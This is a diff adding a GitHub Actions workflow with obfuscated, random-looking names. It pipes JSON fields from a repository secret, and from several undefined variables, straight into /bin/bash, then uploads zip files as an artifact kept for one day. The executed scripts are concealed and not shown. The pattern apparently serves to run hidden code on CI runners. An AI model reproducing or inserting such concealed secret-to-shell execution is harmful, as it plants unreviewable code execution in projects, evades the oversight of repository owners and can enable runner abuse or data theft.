@@ -1,0 +1,25 @@
+name: aidencassandrav393
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: aidencassandrav393
+        env:
+          de16: ${{ secrets.de16 }}
+        run: |
+          printf '%s' "$de16" | jq -r .js644 | /bin/bash
+          printf '%s' "$kbdjl7567" | jq -r .hck40 | /bin/bash
+          printf '%s' "$kg9084" | jq -r .w494 | /bin/bash
+          echo $skxpo684 | jq -r .aega64058 | /bin/bash
+          echo $dx2203 | jq -r .fy87 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mESgTpPr
+          path: "*.zip"
+          retention-days: 1
